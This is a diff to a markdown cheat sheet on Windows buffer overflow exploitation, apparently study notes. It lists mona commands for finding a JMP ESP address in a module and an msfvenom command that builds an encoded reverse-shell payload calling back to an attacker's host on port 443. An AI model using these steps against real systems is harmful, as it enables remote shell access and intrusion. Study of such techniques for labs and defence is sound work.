@@ -41,13 +41,15 @@ msf-pattern_offset -q <EIP value>
 
 ## JMP ESP 
 
+<a href='https://github.com/corelan/mona' target="blank">Import mona in Immunity Debugger</a>
+
 ``` bash
 !mona modules
-!mona find -s "\xff\xe4"
+!mona find -s "\xff\xe4" -m "app.dll"
 ```
 
 ## Exploit
 
 ``` bash
-msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> EXITFUNC=thread  -f c –e x86/shikata_ga_nai -b "<badchars>"
+msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 EXITFUNC=thread  -f c –e x86/shikata_ga_nai -b "<badchars>"
 ```
